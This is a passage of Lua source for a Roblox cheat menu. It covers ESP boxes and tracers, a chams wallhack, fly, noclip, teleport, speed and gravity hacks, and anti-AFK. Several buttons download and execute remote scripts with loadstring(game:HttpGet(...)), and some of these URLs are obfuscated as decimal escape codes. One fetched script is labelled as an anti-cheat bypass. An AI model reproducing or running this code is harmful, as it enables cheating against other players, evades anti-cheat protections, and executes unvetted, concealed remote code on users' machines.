        local V3new = Vector3.new
        local WorldToViewportPoint = cam.WorldToViewportPoint
    
        --Functions--
        local function Draw(obj, props)
            local new = Drawing.new(obj)
            
            props = props or {}
            for i,v in pairs(props) do
                new[i] = v
            end
            return new
        end
    
        function ESP:GetTeam(p)
            local ov = self.Overrides.GetTeam
            if ov then
                return ov(p)
            end
            
            return p and p.Team
        end
    
        function ESP:IsTeamMate(p)
            local ov = self.Overrides.IsTeamMate
            if ov then
                return ov(p)
            end
            
            return self:GetTeam(p) == self:GetTeam(plr)
        end
    
        function ESP:GetColor(obj)
            local ov = self.Overrides.GetColor
            if ov then
                return ov(obj)
            end
            local p = self:GetPlrFromChar(obj)
            return p and self.TeamColor and p.Team and p.Team.TeamColor.Color or self.Color
        end
    
        function ESP:GetPlrFromChar(char)
            local ov = self.Overrides.GetPlrFromChar
            if ov then
                return ov(char)
            end
            
            return plrs:GetPlayerFromCharacter(char)
        end
    
        function ESP:Toggle(bool)
            self.Enabled = bool
            if not bool then
                for i,v in pairs(self.Objects) do
                    if v.Type == "Box" then --fov circle etc
                        if v.Temporary then
                            v:Remove()
                        else
                            for i,v in pairs(v.Components) do
                                v.Visible = false
                            end
                        end
                    end
                end
            end
        end
    
        function ESP:GetBox(obj)
            return self.Objects[obj]
        end
    
        function ESP:AddObjectListener(parent, options)
            local function NewListener(c)
                if type(options.Type) == "string" and c:IsA(options.Type) or options.Type == nil then
                    if type(options.Name) == "string" and c.Name == options.Name or options.Name == nil then
                        if not options.Validator or options.Validator(c) then
                            local box = ESP:Add(c, {
                                PrimaryPart = type(options.PrimaryPart) == "string" and c:WaitForChild(options.PrimaryPart) or type(options.PrimaryPart) == "function" and options.PrimaryPart(c),
                                Color = type(options.Color) == "function" and options.Color(c) or options.Color,
                                ColorDynamic = options.ColorDynamic,
                                Name = type(options.CustomName) == "function" and options.CustomName(c) or options.CustomName,
                                IsEnabled = options.IsEnabled,
                                RenderInNil = options.RenderInNil
                            })
                            --TODO: add a better way of passing options
                            if options.OnAdded then
                                coroutine.wrap(options.OnAdded)(box)
                            end
                        end
                    end
                end
            end
    
            if options.Recursive then
                parent.DescendantAdded:Connect(NewListener)
                for i,v in pairs(parent:GetDescendants()) do
                    coroutine.wrap(NewListener)(v)
                end
            else
                parent.ChildAdded:Connect(NewListener)
                for i,v in pairs(parent:GetChildren()) do
                    coroutine.wrap(NewListener)(v)
                end
            end
        end
    
        local boxBase = {}
        boxBase.__index = boxBase
    
        function boxBase:Remove()
            ESP.Objects[self.Object] = nil
            for i,v in pairs(self.Components) do
                v.Visible = false
                v:Remove()
                self.Components[i] = nil
            end
        end
    
        function boxBase:Update()
            if not self.PrimaryPart then
                --warn("not supposed to print", self.Object)
                return self:Remove()
            end
    
            local color
            if ESP.Highlighted == self.Object then
            color = ESP.HighlightColor
            else
                color = self.Color or self.ColorDynamic and self:ColorDynamic() or ESP:GetColor(self.Object) or ESP.Color
            end
    
            local allow = true
            if ESP.Overrides.UpdateAllow and not ESP.Overrides.UpdateAllow(self) then
                allow = false
            end
            if self.Player and not ESP.TeamMates and ESP:IsTeamMate(self.Player) then
                allow = false
            end
            if self.Player and not ESP.Players then
                allow = false
            end
            if self.IsEnabled and (type(self.IsEnabled) == "string" and not ESP[self.IsEnabled] or type(self.IsEnabled) == "function" and not self:IsEnabled()) then
                allow = false
            end
            if not workspace:IsAncestorOf(self.PrimaryPart) and not self.RenderInNil then
                allow = false
            end
    
            if not allow then
                for i,v in pairs(self.Components) do
                    v.Visible = false
                end
                return
            end
    
            if ESP.Highlighted == self.Object then
                color = ESP.HighlightColor
            end
    
            --calculations--
            local cf = self.PrimaryPart.CFrame
            if ESP.FaceCamera then
                cf = CFrame.new(cf.p, cam.CFrame.p)
            end
            local size = self.Size
            local locs = {
                TopLeft = cf * ESP.BoxShift * CFrame.new(size.X/2,size.Y/2,0),
                TopRight = cf * ESP.BoxShift * CFrame.new(-size.X/2,size.Y/2,0),
                BottomLeft = cf * ESP.BoxShift * CFrame.new(size.X/2,-size.Y/2,0),
                BottomRight = cf * ESP.BoxShift * CFrame.new(-size.X/2,-size.Y/2,0),
                TagPos = cf * ESP.BoxShift * CFrame.new(0,size.Y/2,0),
                Torso = cf * ESP.BoxShift
            }
    
            if ESP.Boxes then
                local TopLeft, Vis1 = WorldToViewportPoint(cam, locs.TopLeft.p)
                local TopRight, Vis2 = WorldToViewportPoint(cam, locs.TopRight.p)
                local BottomLeft, Vis3 = WorldToViewportPoint(cam, locs.BottomLeft.p)
                local BottomRight, Vis4 = WorldToViewportPoint(cam, locs.BottomRight.p)
    
                if self.Components.Quad then
                    if Vis1 or Vis2 or Vis3 or Vis4 then
                        self.Components.Quad.Visible = true
                        self.Components.Quad.PointA = Vector2.new(TopRight.X, TopRight.Y)
                        self.Components.Quad.PointB = Vector2.new(TopLeft.X, TopLeft.Y)
                        self.Components.Quad.PointC = Vector2.new(BottomLeft.X, BottomLeft.Y)
                        self.Components.Quad.PointD = Vector2.new(BottomRight.X, BottomRight.Y)
                        self.Components.Quad.Color = color
                    else
                        self.Components.Quad.Visible = false
                    end
                end
            else
                self.Components.Quad.Visible = false
            end
    
            if ESP.Names then
                local TagPos, Vis5 = WorldToViewportPoint(cam, locs.TagPos.p)
                
                if Vis5 then
                    self.Components.Name.Visible = true
                    self.Components.Name.Position = Vector2.new(TagPos.X, TagPos.Y)
                    self.Components.Name.Text = self.Name
                    self.Components.Name.Color = color
                    
                    self.Components.Distance.Visible = true
                    self.Components.Distance.Position = Vector2.new(TagPos.X, TagPos.Y + 14)
                    self.Components.Distance.Text = math.floor((cam.CFrame.p - cf.p).magnitude) .."m away"
                    self.Components.Distance.Color = color
                else
                    self.Components.Name.Visible = false
                    self.Components.Distance.Visible = false
                end
            else
                self.Components.Name.Visible = false
                self.Components.Distance.Visible = false
            end
            
            if ESP.Tracers then
                local TorsoPos, Vis6 = WorldToViewportPoint(cam, locs.Torso.p)
    
                if Vis6 then
                    self.Components.Tracer.Visible = true
                    self.Components.Tracer.From = Vector2.new(TorsoPos.X, TorsoPos.Y)
                    self.Components.Tracer.To = Vector2.new(cam.ViewportSize.X/2,cam.ViewportSize.Y/ESP.AttachShift)
                    self.Components.Tracer.Color = color
                else
                    self.Components.Tracer.Visible = false
                end
            else
                self.Components.Tracer.Visible = false
            end
        end
    
        function ESP:Add(obj, options)
            if not obj.Parent and not options.RenderInNil then
                return warn(obj, "has no parent")
            end
    
            local box = setmetatable({
                Name = options.Name or obj.Name,
                Type = "Box",
                Color = options.Color --[[or self:GetColor(obj)]],
                Size = options.Size or self.BoxSize,
                Object = obj,
                Player = options.Player or plrs:GetPlayerFromCharacter(obj),
                PrimaryPart = options.PrimaryPart or obj.ClassName == "Model" and (obj.PrimaryPart or obj:FindFirstChild("HumanoidRootPart") or obj:FindFirstChildWhichIsA("BasePart")) or obj:IsA("BasePart") and obj,
                Components = {},
                IsEnabled = options.IsEnabled,
                Temporary = options.Temporary,
                ColorDynamic = options.ColorDynamic,
                RenderInNil = options.RenderInNil
            }, boxBase)
    
            if self:GetBox(obj) then
                self:GetBox(obj):Remove()
            end
    
            box.Components["Quad"] = Draw("Quad", {
                Thickness = self.Thickness,
                Color = color,
                Transparency = 1,
                Filled = false,
                Visible = self.Enabled and self.Boxes
            })
            box.Components["Name"] = Draw("Text", {
                Text = box.Name,
                Color = box.Color,
                Center = true,
                Outline = true,
                Size = 19,
                Visible = self.Enabled and self.Names
            })
            box.Components["Distance"] = Draw("Text", {
                Color = box.Color,
                Center = true,
                Outline = true,
                Size = 19,
                Visible = self.Enabled and self.Names
            })
            
            box.Components["Tracer"] = Draw("Line", {
                Thickness = ESP.Thickness,
                Color = box.Color,
                Transparency = 1,
                Visible = self.Enabled and self.Tracers
            })
            self.Objects[obj] = box
            
            obj.AncestryChanged:Connect(function(_, parent)
                if parent == nil and ESP.AutoRemove ~= false then
                    box:Remove()
                end
            end)
            obj:GetPropertyChangedSignal("Parent"):Connect(function()
                if obj.Parent == nil and ESP.AutoRemove ~= false then
                    box:Remove()
                end
            end)
    
            local hum = obj:FindFirstChildOfClass("Humanoid")
            if hum then
                hum.Died:Connect(function()
                    if ESP.AutoRemove ~= false then
                        box:Remove()
                    end
                end)
            end
    
            return box
        end
    
        local function CharAdded(char)
            local p = plrs:GetPlayerFromCharacter(char)
            if not char:FindFirstChild("HumanoidRootPart") then
                local ev
                ev = char.ChildAdded:Connect(function(c)
                    if c.Name == "HumanoidRootPart" then
                        ev:Disconnect()
                        ESP:Add(char, {
                            Name = p.Name,
                            Player = p,
                            PrimaryPart = c
                        })
                    end
                end)
            else
                ESP:Add(char, {
                    Name = p.Name,
                    Player = p,
                    PrimaryPart = char.HumanoidRootPart
                })
            end
        end
        local function PlayerAdded(p)
            p.CharacterAdded:Connect(CharAdded)
            if p.Character then
                coroutine.wrap(CharAdded)(p.Character)
            end
        end
        plrs.PlayerAdded:Connect(PlayerAdded)
        for i,v in pairs(plrs:GetPlayers()) do
            if v ~= plr then
                PlayerAdded(v)
            end
        end
    
        game:GetService("RunService").RenderStepped:Connect(function()
            cam = workspace.CurrentCamera
            for i,v in (ESP.Enabled and pairs or ipairs)(ESP.Objects) do
                if v.Update then
                    local s,e = pcall(v.Update, v)
                    if not s then warn("[EU]", e, v.Object:GetFullName()) end
                end
            end
        end)
    
        ----[[ Now Begins WRD's modification for implementation ]]----
    
        --Sets defaults where required
        if _G.WRDESPEnabled == nil then _G.WRDESPEnabled = true end
        if _G.WRDESPBoxes == nil then _G.WRDESPBoxes = true end
        if _G.WRDESPTeamColors == nil then _G.WRDESPTeamColors = true end
        if _G.WRDESPTracers == nil then _G.WRDESPTracers = false end
        if _G.WRDESPNames == nil then _G.WRDESPNames = true end
        
        --Hacky way to keep up with setting changes
        while wait(.1) do
            ESP:Toggle(_G.WRDESPEnabled or false)
            ESP.Boxes = _G.WRDESPBoxes or false
            ESP.TeamColors = _G.WRDESPTeamColors or false
            ESP.Tracers = _G.WRDESPTracers or false
            ESP.Names = _G.WRDESPNames or false
        end
    
        _G.WRDESPLoaded = true
    end
        end
    end)
    Section:NewToggle("Boxes", "a", function(state)
        if state then
            _G.WRDESPBoxes = true
        else
            _G.WRDESPBoxes = false
        end
    end)
    Section:NewToggle("TeamColors", "b", function(state)
        if state then
            _G.WRDESPTeamColors = true
        else
            _G.WRDESPTeamColors = false
        end
    end)
    Section:NewToggle("Tracers", "c", function(state)
        if state then
            _G.WRDESPTracers = true
        else
            _G.WRDESPTracers = false
        end
    end)
    Section:NewToggle("Names", "d", function(state)
        if state then
            _G.WRDESPNames = true
        else
            _G.WRDESPNames = false
        end
    end)
    Section:NewLabel("Random ESP")
    Section:NewButton("Chams with glow ESP (ISSUES)", "Its like a wallhack", function()
    local dwEntities = game:GetService("Players")
    local dwLocalPlayer = dwEntities.LocalPlayer 
    local dwRunService = game:GetService("RunService")
    
    local settings_tbl = {
        ESP_Enabled = true,
        ESP_TeamCheck = false,
        Chams = true,
        Chams_Color = Color3.fromRGB(0, 255, 0),
        Chams_Transparency = 0.4,
        Chams_Glow_Color = Color3.fromRGB(255,0,0)
    }
    
    function destroy_chams(char)
    
        for k,v in next, char:GetChildren() do 
    
            if v:IsA("BasePart") and v.Transparency ~= 1 then
    
                if v:FindFirstChild("Glow") and 
                v:FindFirstChild("Chams") then
    
                    v.Glow:Destroy()
                    v.Chams:Destroy() 
    
                end 
    
            end 
    
        end 
    
    end
    
    dwRunService.Heartbeat:Connect(function()
    
        if settings_tbl.ESP_Enabled then
    
            for k,v in next, dwEntities:GetPlayers() do 
    
                if v ~= dwLocalPlayer then
    
                    if v.Character and
                    v.Character:FindFirstChild("HumanoidRootPart") and 
                    v.Character:FindFirstChild("Humanoid") and 
                    v.Character:FindFirstChild("Humanoid").Health ~= 0 then
    
                        if settings_tbl.ESP_TeamCheck == false then
    
                            local char = v.Character 
    
                            for k,b in next, char:GetChildren() do 
    
                                if b:IsA("BasePart") and 
                                b.Transparency ~= 1 then
                                    
                                    if settings_tbl.Chams then
    
                                        if not b:FindFirstChild("Glow") and
                                        not b:FindFirstChild("Chams") then
    
                                            local chams_box = Instance.new("BoxHandleAdornment", b)
                                            chams_box.Name = "Chams"
                                            chams_box.AlwaysOnTop = true 
                                            chams_box.ZIndex = 4 
                                            chams_box.Adornee = b 
                                            chams_box.Color3 = settings_tbl.Chams_Color
                                            chams_box.Transparency = settings_tbl.Chams_Transparency
                                            chams_box.Size = b.Size + Vector3.new(0.02, 0.02, 0.02)
    
                                            local glow_box = Instance.new("BoxHandleAdornment", b)
                                            glow_box.Name = "Glow"
                                            glow_box.AlwaysOnTop = false 
                                            glow_box.ZIndex = 3 
                                            glow_box.Adornee = b 
                                            glow_box.Color3 = settings_tbl.Chams_Glow_Color
                                            glow_box.Size = chams_box.Size + Vector3.new(0.13, 0.13, 0.13)
    
                                        end
    
                                    else
    
                                        destroy_chams(char)
    
                                    end
                                
                                end
    
                            end
    
                        else
    
                            if v.Team == dwLocalPlayer.Team then
                                destroy_chams(v.Character)
                            end
    
                        end
    
                    else
    
                        destroy_chams(v.Character)
    
                    end
    
                end
    
            end
    
        else 
    
            for k,v in next, dwEntities:GetPlayers() do 
    
                if v ~= dwLocalPlayer and 
                v.Character and 
                v.Character:FindFirstChild("HumanoidRootPart") and 
                v.Character:FindFirstChild("Humanoid") and 
                v.Character:FindFirstChild("Humanoid").Health ~= 0 then
                    
                    destroy_chams(v.Character)
    
                end
    
            end
    
        end
    
    end)
end)
Section:NewLabel("Visuals")
    Section:NewButton("Clear Fog", "delete fog from game", function()
        game.Lighting.Atmosphere:Destroy() game.Lighting.DepthOfField:Destroy() game.Lighting.FogStart = 1e20 game.Lighting.FogEnd = 1e20
    end)

    Section:NewButton("KeyStrokes", "Its a very good keystrokes", function()
        loadstring(game:HttpGet("https://system-exodus.com/scripts/misc-releases/Keystrokes.lua",true))()
    end)
    
    local Tab = Window:NewTab("Misc")
    local Section = Tab:NewSection("Solo script")

    Section:NewButton("IDK", "Changue Sky", function()
        loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\75\101\111\110\101\71\105\116\104\117\98\83\112\97\109\47\75\101\111\110\101\71\105\116\104\117\98\83\112\97\109\47\109\97\105\110\47\78\97\117\103\104\116\121\78\97\117\103\104\116\121\47\68\101\99\97\108\115"))()
    end)
    Section:NewButton("Server Hop", "If you click this you automatic go to other server", function()
        loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\86\100\117\66\84\50\110\116"))()
    end)
    Section:NewButton("Remove textures | Fps boost", "", function()
        loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\75\101\111\110\101\71\105\116\104\117\98\83\112\97\109\47\75\101\111\110\101\71\105\116\104\117\98\83\112\97\109\47\109\97\105\110\47\70\112\115\66\111\111\115\116\84\101\120\116\117\114\101"))()
    end)
    Section:NewButton("Spin + noclip | Reset to stop", "Nothing", function()
        loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\87\86\50\117\114\90\85\119"))()
    end)
    Section:NewButton("Max Zoom", "", function()
        loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\75\101\111\110\101\71\105\116\104\117\98\83\112\97\109\47\75\101\111\110\101\71\105\116\104\117\98\83\112\97\109\47\109\97\105\110\47\77\97\120\90\111\111\109\47\76\69\83\83\71\79\79\90\79\79\77"))()
    end)
    Section:NewButton("Free cam", "Press SHITF+P For turn on", function()
        loadstring(game:HttpGet("https://pastebin.com/raw/ct8Kq5F0", true))()
    end)
    
    local Tab = Window:NewTab("Guis+Hubs")
    local Section = Tab:NewSection("Hubs!")
    Section:NewButton("Utility GUI", "Modified by solo script (made by ???)", function()
        local ui = loadstring(game:HttpGet('https://raw.githubusercontent.com/BoaHacker/ROBLOX/main/ui', true))()
    
    local player = game.Players.LocalPlayer
    local mouse = player:GetMouse()
    local antiAFK = true
    player.Idled:connect(function()
        if antiAFK then
            game.VirtualUser:Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
            wait(1)
            game.VirtualUser:Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
        end
    end)
    
    local Player = ui:CreateWindow({
        text = 'Utility'
    })
    
    local Settings = ui:CreateWindow({
        text = 'Destroy'
    })
    
    Player:AddToggle('Infinite Jump', function(state)
        getgenv().InfiniteJump = state
        game.UserInputService.JumpRequest:connect(function()
            if not getgenv().InfiniteJump then return end
            player.Character.Humanoid:ChangeState('Jumping')
        end)
    end)
    Player:AddToggle('Click to TP', function(state)
        getgenv().ClicktoTP = state
        mouse.Button1Down:Connect(function()
            if not getgenv().ClicktoTP then return end
            player.Character.HumanoidRootPart.CFrame = CFrame.new(mouse.Hit.x, mouse.Hit.y + 5, mouse.Hit.z) * CFrame.Angles(0, math.rad(player.Character.HumanoidRootPart.Orientation.Y), 0)
        end)
    end)
    
    Player:AddToggle('Noclip', function(state)
        getgenv().Noclip = state
        while true do
            if not getgenv().Noclip then return end
            game.RunService.Stepped:wait()
            for i, v in pairs(player.Character:GetDescendants()) do
                if v:IsA('BasePart') then
                    v.CanCollide = false
                end
            end
        end
    end)
    for i, v in pairs(workspace:GetChildren()) do
        if v.Name == 'Core' then
            v:Destroy()
        end
    end
    local Core = Instance.new('Part', workspace)
    Core.Name = 'Core'
    Core.Size = Vector3.new(0.05, 0.05, 0.05)
    Core.CanCollide = false
    workspace:WaitForChild('Core')
    local torso = workspace.Core
    local speed = 2
    local keys = {a = false, d = false, w = false, s = false}
    local e1
    local e2
    local function Fly()
        local pos = Instance.new('BodyPosition', torso)
        local gyro = Instance.new('BodyGyro', torso)
        pos.maxForce = Vector3.new(math.huge, math.huge, math.huge)
        pos.position = torso.Position
        gyro.maxTorque = Vector3.new(9e9, 9e9, 9e9)
        gyro.cframe = torso.CFrame
        repeat
            wait()
            player.Character.Humanoid.PlatformStand = true
            local new = gyro.cframe - gyro.cframe.p + pos.position
            if not keys.w and not keys.s and not keys.a and not keys.d then
                speed = 1
            end
            if keys.w then
                new = new + workspace.CurrentCamera.CoordinateFrame.lookVector * speed
                speed = speed + 0
            end
            if keys.s then
                new = new - workspace.CurrentCamera.CoordinateFrame.lookVector * speed
                speed = speed + 0
            end
            if keys.d then
                new = new * CFrame.new(speed, 0, 0)
                speed = speed + 0
            end
            if keys.a then
                new = new * CFrame.new(-speed, 0, 0)
                speed = speed + 0
            end
            if speed > 10 then
                speed = 5
            end
            pos.position = new.p
            if keys.w then
                gyro.cframe = workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad(speed * 0), 0, 0)
            elseif keys.s then
                gyro.cframe = workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(math.rad(speed * 0), 0, 0)
            else
                gyro.cframe = workspace.CurrentCamera.CoordinateFrame
            end
        until getgenv().Fly == false
        if gyro then gyro:Destroy() end
        if pos then pos:Destroy() end
        player.Character.Humanoid.PlatformStand = false
        speed = 2
    end
    e1 = mouse.KeyDown:connect(function(key)
        if not torso or not torso.Parent then e1:disconnect() e2:disconnect() return end
        if key == 'w' then
            keys.w = true
        elseif key == 's' then
            keys.s = true
        elseif key == 'a' then
            keys.a = true
        elseif key == 'd' then
            keys.d = true
        end
    end)
    e2 = mouse.KeyUp:connect(function(key)
        if key == 'w' then
            keys.w = false
        elseif key == 's' then
            keys.s = false
        elseif key == 'a' then
            keys.a = false
        elseif key == 'd' then
            keys.d = false
        end
    end)
    Player:AddToggle('Fly', function(state)
        getgenv().Fly = state
        if not getgenv().Fly then for i, v in pairs(workspace:FindFirstChild('Core'):GetChildren()) do v:Destroy() end return end
        local Weld = Instance.new('Weld', Core)
        Weld.Part0 = Core
        Weld.Part1 = player.Character.HumanoidRootPart
        Weld.C0 = CFrame.new(0, 0, 0)
        Fly()
    end)
    
    Player:AddBox('Walkspeed', function(state)
        if tonumber(state.Text) ~= nil then
            player.Character.Humanoid.WalkSpeed = state.Text
        end
    end)
    
    Player:AddBox('Jumppower', function(state)
        if tonumber(state.Text) ~= nil then
            if player.Character.Humanoid.UseJumpPower == true then
                player.Character.Humanoid.JumpPower = state.Text
            else
                player.Character.Humanoid.JumpHeight = state.Text
            end
        end
    end)
    
    Player:AddBox('Gravity', function(state)
        if tonumber(state.Text) ~= nil then
            workspace.Gravity = state.Text
        end
    end)
    
    Player:AddButton('Reset to Default', function()
        player.Character.Humanoid.WalkSpeed = 16
        if player.Character.Humanoid.UseJumpPower == true then
            player.Character.Humanoid.JumpPower = 50
        else
            player.Character.Humanoid.JumpHeight = 7.2
        end
        player.Character.Humanoid.JumpPower = 50
        workspace.Gravity = 196.2
    end)
    
    Settings:AddButton('Destroy gui xD', function()
        ui.gui:Destroy()
        antiAFK = false
        getgenv().InfiniteJump = false
        getgenv().ClicktoTP = false
        getgenv().Noclip = false
        getgenv().Fly = false
        player.Character.Humanoid.WalkSpeed = 16
        if player.Character.Humanoid.UseJumpPower == true then
            player.Character.Humanoid.JumpPower = 50
        else
            player.Character.Humanoid.JumpHeight = 7.2
        end
        workspace.Gravity = 196.2
    end)
    end)
    
    
    
    local Tab = Window:NewTab("Credits")
    local Section = Tab:NewSection("------------------------------------------------------------------")
    Section:NewLabel("Creator : Solo script")
    Section:NewLabel("Solo script founder : lolocahhh45")
    Section:NewLabel("Discord-https://discord.gg/gYqbqSNUvK")
    Section:NewKeybind("Gui toggle", "Toggle gui with F or changue to other key", Enum.KeyCode.V, function()
        Library:ToggleUI()
    end)
    Section:NewButton("COPY DISCORD SERVER", "", function()
        setclipboard("https://discord.gg/gYqbqSNUvK")
    end)
    -- Main
    local FlyTab = Window:NewTab("Fly")
    local FlySection = FlyTab:NewSection("Solo script")
    
       -- SETUP
       _G.FlySpeed = 15
       _G.flykeybind = G
       if _G.Setup then
       else
           _G.Setup = true
       end
       
       -- UI And Fly Functions

FlySection:NewToggle("Cframe fly V1.2", "Key = X", function(state)
   if state then
       _G.CframeFlyState = true

--Start fly

spawn(function()   
   loadstring(game:HttpGet("https://raw.githubusercontent.com/LegitH3x0R/Roblox-Scripts/main/AEBypassing/RootAnchor.lua"))()

   if _G.CframeFlyState == true then
   else
   _G.CframeFlyState = false
   end

   local UIS = game:GetService("UserInputService")
   local OnRender = game:GetService("RunService").RenderStepped
   
   local Player = game:GetService("Players").LocalPlayer
   local Character = Player.Character or Player.CharacterAdded:Wait()
   
   local Camera = workspace.CurrentCamera
   local Root = Character:WaitForChild("HumanoidRootPart")
   local C1, C2, C3;
   local Nav = {Flying = false, Forward = false, Backward = false, Left = false, Right = false}
   C1 = UIS.InputBegan:Connect(function(Input)
       if Input.UserInputType == Enum.UserInputType.Keyboard then
           if Input.KeyCode == Enum.KeyCode.G and _G.CframeFlyState then
               
               Nav.Flying = not Nav.Flying
               Root.Anchored = Nav.Flying
           elseif Input.KeyCode == Enum.KeyCode.W then
               Nav.Forward = true
           elseif Input.KeyCode == Enum.KeyCode.S then
               Nav.Backward = true
           elseif Input.KeyCode == Enum.KeyCode.A then
               Nav.Left = true
           elseif Input.KeyCode == Enum.KeyCode.D then
               Nav.Right = true
           end
       end
   end)
   
   C2 = UIS.InputEnded:Connect(function(Input)
       if Input.UserInputType == Enum.UserInputType.Keyboard then
           if Input.KeyCode == Enum.KeyCode.W then
               Nav.Forward = false
           elseif Input.KeyCode == Enum.KeyCode.S then
               Nav.Backward = false
           elseif Input.KeyCode == Enum.KeyCode.A then
               Nav.Left = false
           elseif Input.KeyCode == Enum.KeyCode.D then
               Nav.Right = false
           end
       end
   end)
   
   C3 = Camera:GetPropertyChangedSignal("CFrame"):Connect(function()
       if Nav.Flying then
           Root.CFrame = CFrame.new(Root.CFrame.Position, Root.CFrame.Position + Camera.CFrame.LookVector)
       end
   end)
   
   while true do
       local Delta = OnRender:Wait()
       if Nav.Flying then
           if Nav.Forward then
               Root.CFrame = Root.CFrame + (Camera.CFrame.LookVector * (Delta * _G.FlySpeed))
           end
           if Nav.Backward then
               Root.CFrame = Root.CFrame + (-Camera.CFrame.LookVector * (Delta * _G.FlySpeed))
           end
           if Nav.Left then
               Root.CFrame = Root.CFrame + (-Camera.CFrame.RightVector * (Delta * _G.FlySpeed))
           end
           if Nav.Right then
               Root.CFrame = Root.CFrame + (Camera.CFrame.RightVector * (Delta * _G.FlySpeed))
           end
       end
   end
end)

--start fly on respawn:
       local player = game.Players.LocalPlayer

player.CharacterAdded:Connect(function(character)
   wait(0.5)
if _G.CframeFlyState == true then

   spawn(function()   
       loadstring(game:HttpGet("https://raw.githubusercontent.com/LegitH3x0R/Roblox-Scripts/main/AEBypassing/RootAnchor.lua"))()

       if _G.CframeFlyState == true then
       else
       _G.CframeFlyState = false
       end

       local UIS = game:GetService("UserInputService")
       local OnRender = game:GetService("RunService").RenderStepped
       
       local Player = game:GetService("Players").LocalPlayer
       local Character = Player.Character or Player.CharacterAdded:Wait()
       
       local Camera = workspace.CurrentCamera
       local Root = Character:WaitForChild("HumanoidRootPart")
       local C1, C2, C3;
       local Nav = {Flying = false, Forward = false, Backward = false, Left = false, Right = false}
       C1 = UIS.InputBegan:Connect(function(Input)
           if Input.UserInputType == Enum.UserInputType.Keyboard then
               if Input.KeyCode == Enum.KeyCode.X and _G.CframeFlyState then
                   
                   Nav.Flying = not Nav.Flying
                   Root.Anchored = Nav.Flying
               elseif Input.KeyCode == Enum.KeyCode.W then
                   Nav.Forward = true
               elseif Input.KeyCode == Enum.KeyCode.S then
                   Nav.Backward = true
               elseif Input.KeyCode == Enum.KeyCode.A then
                   Nav.Left = true
               elseif Input.KeyCode == Enum.KeyCode.D then
                   Nav.Right = true
               end
           end
       end)
       
       C2 = UIS.InputEnded:Connect(function(Input)
           if Input.UserInputType == Enum.UserInputType.Keyboard then
               if Input.KeyCode == Enum.KeyCode.W then
                   Nav.Forward = false
               elseif Input.KeyCode == Enum.KeyCode.S then
                   Nav.Backward = false
               elseif Input.KeyCode == Enum.KeyCode.A then
                   Nav.Left = false
               elseif Input.KeyCode == Enum.KeyCode.D then
                   Nav.Right = false
               end
           end
       end)
       
       C3 = Camera:GetPropertyChangedSignal("CFrame"):Connect(function()
           if Nav.Flying then
               Root.CFrame = CFrame.new(Root.CFrame.Position, Root.CFrame.Position + Camera.CFrame.LookVector)
           end
       end)
       
       while true do
           local Delta = OnRender:Wait()
           if Nav.Flying then
               if Nav.Forward then
                   Root.CFrame = Root.CFrame + (Camera.CFrame.LookVector * (Delta * _G.FlySpeed))
               end
               if Nav.Backward then
                   Root.CFrame = Root.CFrame + (-Camera.CFrame.LookVector * (Delta * _G.FlySpeed))
               end
               if Nav.Left then
                   Root.CFrame = Root.CFrame + (-Camera.CFrame.RightVector * (Delta * _G.FlySpeed))
               end
               if Nav.Right then
                   Root.CFrame = Root.CFrame + (Camera.CFrame.RightVector * (Delta * _G.FlySpeed))
               end
           end
       end
   end)

end
end)

   else

       _G.CframeFlyState = false
   end
end)
    
    FlySection:NewSlider("CFrame Fly Speed", "Speed of the CFrame Fly!", 40, 0, function(s) -- 25 (MaxValue) | 0 (MinValue)
        _G.FlySpeed = s
    end)
    FlySection:NewLabel("========================================")
    FlySection:NewSlider("Fly Speed", "Speed of the Fly and noclip gui", 40, 1, function(s) -- 250 (MaxValue) | 1 (MinValue)
        _G.Fly = s
    end)
    FlySection:NewSlider("NoclipFly Speed", "Speed of the CFrame Fly!", 40, 1, function(s) -- 250 (MaxValue) | 1 (MinValue)
        _G.NoclipFly = s
    end)
    FlySection:NewButton("Fly and noclip gui", "Modified by Solo script", function()
       local ScreenGui = Instance.new("ScreenGui")
    local Frame = Instance.new("Frame")
    local TextLabel = Instance.new("TextLabel")
    local TextLabel_2 = Instance.new("TextLabel")
    local TextButton = Instance.new("TextButton")
    local TextButton_2 = Instance.new("TextButton")
    
    --Properties:
    
    ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    
    Frame.Parent = ScreenGui
    Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    Frame.Position = UDim2.new(0.0833889246, 0, 0.562569201, 0)
    Frame.Size = UDim2.new(0, 309, 0, 244)
    
    TextLabel.Parent = Frame
    TextLabel.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    TextLabel.Position = UDim2.new(-0.00203825813, 0, -0.00307051861, 0)
    TextLabel.Size = UDim2.new(0, 309, 0, 25)
    TextLabel.Font = Enum.Font.SourceSans
    TextLabel.Text = "Fly and noclip Gui"
    TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
    TextLabel.TextScaled = true
    TextLabel.TextSize = 14.000
    TextLabel.TextWrapped = true
    
    TextLabel_2.Parent = Frame
    TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    TextLabel_2.Position = UDim2.new(-0.00203825813, 0, 0.894470453, 0)
    TextLabel_2.Size = UDim2.new(0, 309, 0, 25)
    TextLabel_2.Font = Enum.Font.SourceSans
    TextLabel_2.Text = "Modified by Solo Script"
    TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
    TextLabel_2.TextScaled = true
    TextLabel_2.TextSize = 14.000
    TextLabel_2.TextWrapped = true
    
    TextButton.Parent = Frame
    TextButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
